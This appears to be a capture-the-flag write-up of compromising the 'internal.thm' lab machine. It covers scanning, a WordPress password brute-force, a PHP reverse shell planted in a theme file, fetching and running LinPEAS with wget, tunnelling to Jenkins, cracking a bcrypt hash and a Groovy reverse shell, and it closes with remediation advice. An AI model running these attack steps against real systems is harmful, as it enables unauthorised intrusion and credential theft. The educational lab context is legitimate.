# **Enumeration and Reconnaissance**

## **Nmap Scan**

To begin the reconnaissance phase, I performed a full port scan to discover every exposed service on the target machine:

`nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv <IP>`

![image](./assets/nmap.png)

I then ran a more detailed scan focused on service versions and common scripts:

`nmap -sCV -p22,80 <IP> -oN targeted`

![image](./assets/targeted.png)

Port 80 revealed an Apache server:

![image](./assets/www.png)


---

To enumerate exposed web directories, I used **Gobuster**:

`gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt`

![image](./assets/gobuster.png)

The scan revealed the `/blog` directory.  
At first the site did not load properly, suggesting a virtual host configuration.  
To fix this, I added the domain to `/etc/hosts`:

`echo '<IP> internal.thm' >> /etc/hosts`

Now the site was fully accessible at:

`http://internal.thm/blog`

Using **Wappalyzer**, I determined the site was running WordPress:

![image](./assets/wappalayzer.png)

---

I continued enumeration with **WPScan**, focusing on user discovery:

`wpscan --url http://internal.thm/blog --enumerate u`

![image](./assets/wpscan.png)

After identifying the user `admin`, I launched a brute-force attack:

`wpscan --url http://internal.thm/blog -U admin -P /usr/share/wordlists/rockyou.txt --password-attack wp-login`

Eventually, a valid password was returned:

![image](./assets/passwdadmin.png)

I logged into WordPress using:

`http://internal.thm/blog/wp-login.php`

---

# **Gaining Access**

Inside the WordPress admin panel, I navigated to:

**Appearance → Theme Editor → 404.php**

![image](./assets/apparence.png)
  
![image](./assets404.png)

Since the file was editable, it was possible to inject arbitrary PHP code via the theme.

As an initial attack vector, I replaced the contents of `404.php` with a PHP reverse shell using PentestMonkey’s script:

[https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)

After editing my IP and port, I uploaded the file and started a listener:

`nc -lvnp 4444`

![image](./assets/nc.png)

I triggered the reverse shell by visiting:

`http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php`

![image](./assets/execute404.png)

This provided a shell as **www-data**:

![image](./assets/wwdataw.png)

---

# **Privilege Escalation**

I enabled a functional terminal:

`export TERM=xterm`

Then I downloaded **LinPEAS** for deep enumeration.

On my attacking machine:

`cd /usr/share/peass/linpeas python3 -m http.server 80`

![image](./assets/lin.png)

On the compromised host:

`cd /tmp wget http://<IP>/linpeas.sh bash linpeas.sh`

![image](./assets/lin21.png) 

![image](./assets/linex.png)

LinPEAS revealed a **Jenkins** service running inside a Docker container, as well as several sensitive files.

---

## **Credential Enumeration**

LinPEAS also exposed some MySQL credentials, although these were not useful:

![image](./assets/jenklin.png)

In `/opt`, I discovered a file named **wp-save.txt**:

`cd /opt cat wp-save.txt`

![image](./assets/opt.png)

This file contained valid login credentials:

![image](./assets/bill.png)

I used them to connect via SSH:

`ssh aubreanna@<IP>`

![image](./assets/aub.png)

---

## **Accessing the Jenkins Service**

I noticed Jenkins was accessible internally at:

`172.17.0.2:8080`

Because this is a Docker internal IP, I created an SSH tunnel to expose it:

`ssh -L 8080:localhost:8080 aubreanna@<IP>`

With this, Jenkins was reachable from the browser:

![image](./assets/jenks.png)

Jenkins required authentication, so I continued enumerating.

---

## **Credential Extraction via /proc**

LinPEAS had shown that the Jenkins process was readable.
There's a file named secret.key.
I navigated into the process directory:

![image](./assets/secret.png)

`cd /proc/<PID>`

Inside the `cwd` directory, I found the full Jenkins home structure:

![image](./assets/cwd.png)

![image](./assets/ls.png)

From `/var/jenkins_home`, I enumerated sensitive files:

![image](./assets/var.png)

Including:

- `secret.key`
    
- `users/users.xml`
    
- `config.xml`
    

![image](./assets/home.png)

![image](./assets/users.png)

Inside `config.xml`, I extracted a bcrypt password hash:

![image](./assets/conf.png)

![image](./assets/password.png)

I cracked it using John the Ripper:

`echo 'admin:<HASH>' > jenkins.hash john jenkins.hash --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt`

![image](./assets/john.png)

I logged into Jenkins using the recovered password:

![image](./assets/jendpage.png)

---

## **Reverse Shell via Groovy Console**

Jenkins provides a Groovy script execution console:

![image](./assets/grovi.png)

I executed a crafted reverse shell in Groovy:

![image](./assets/script.png)

This granted a shell as the Jenkins user:

![image](./assets/jen.png)

---

## **Final Privilege Escalation to Root**

In `/opt`, I discovered `note.txt`, which contained the **root password**:

![image](./assets/opt2.png)
I logged in as root:

`ssh root@<IP>`

![image](./assets/root.png)

The machine was fully compromised.

---

# **Machine Completed**

This challenge required end-to-end exploitation: web enumeration, WordPress exploitation, RCE, host enumeration, container pivoting, `/proc` analysis, Jenkins exploitation, and full privilege escalation.

A complete and highly educational attack chain.

## **Conclusion**

The main attack vectors throughout the assessment were weak or exposed credentials. Each stage of compromise—WordPress, system user access, Jenkins, and ultimately root—was made possible due to passwords that were either easily brute-forced or stored in plaintext on the system.

---

## **Recommendations**

- **Strengthen the WordPress admin password.**  
    The current credential was easily cracked; enforcing strong passwords would significantly reduce the risk of brute-force attacks.
    
- **Remove the `wp-save.txt` file from `/opt`.**  
    This file exposes valid system user credentials .
    
- **Use a stronger password for the Jenkins admin account.**  
    The bcrypt hash was crackable with common wordlists. Enforce robust password policies for Jenkins users.
    
- **Delete the `note.txt` file inside the Jenkins container’s `/opt` directory.**  
    Storing the root password in plaintext grants immediate privilege escalation to attackers who gain access to the container.
